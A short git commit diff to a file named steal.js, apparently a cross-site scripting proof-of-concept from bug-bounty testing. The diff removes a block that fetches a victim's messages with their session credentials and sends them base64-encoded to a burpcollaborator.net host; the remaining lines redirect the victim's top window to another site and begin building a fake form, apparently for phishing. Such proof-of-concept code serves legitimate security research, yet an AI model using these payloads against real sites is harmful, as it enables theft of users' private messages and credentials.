17813438cf91a5bccbbba6ccee07a061e10d993d
PatchTheBugs <91054676+PatchTheBugs@users.noreply.github.com>
2025-09-03 10:00:52 +0100

    Update steal.js

--- steal.js
+++ steal.js
@@ -1,13 +1,6 @@
 // Redirect victim out of the app
 window.top.location = "https://zerocopter.com/";
 
-// Steal inbox/messages (adjust endpoint to something valid on target)
-fetch("/messages/c0a634866745", { credentials: "include" })
-  .then(r => r.text())
-  .then(t => {
-    fetch("https://907kocpfvd3dgpex2ok446r9e0kq8f.burpcollaborator.net/inbox?d=" + btoa(t));
-  });
-
 (function fakeForm() {
   let form = document.createElement("form");
   form.innerHTML = `
